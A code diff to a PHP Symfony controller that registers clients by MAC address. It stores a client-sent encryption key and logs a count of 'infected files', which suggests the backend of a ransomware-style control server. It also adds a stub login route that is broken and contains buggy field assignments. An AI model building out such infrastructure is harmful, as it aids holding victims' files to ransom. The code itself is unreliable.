@@ -28,15 +28,16 @@ class UserController extends BaseController
     {
         try {
             $data = json_decode($request->getContent(), true);
+            $macAdress = $data['macAdress'];
 
-            $ip = $data['ip'];
             $encryptionKey = $data['encryptionKey'];
 
-            $user = $this->userRepository->findOneBy(['ip' => $ip]) ?? new User();
+            $user = $this->userRepository->findOneBy(['macAddress' => $macAdress]) ?? new User();
+            if(array_key_exists('ip', $data)) $user->setIp($data['ip']);
 
             $uuid = Uuid::v4();
 
-            $user->setIp($ip)
+            $user->setMacAddress($macAdress)
                 ->setPassword($this->passwordHasher->hashPassword(
                     $user,
                     $uuid
@@ -47,13 +48,26 @@ class UserController extends BaseController
             $this->userRepository->save($user, true);
 
             $log = (new Log)
-                ->setIp($ip);
+                ->setIp($macAdress);
 
             if(array_key_exists('infectedFiles', $data)) $log->setNumberInfectedFile($data['infectedFiles']);
 
             $this->logRepository->save($log, true);
 
             return $this->json($uuid);
+        } catch(\Throwable $e) {
+            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
+        }
+    }
+
+    /**
+     * @Route('/login')
+     */
+    public function login(): Response
+    {
+        try {
+            $data = json_decode($request->getContent(), true);
+            return $this->json();
         } catch(\Throwable $e) {
             return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
         }
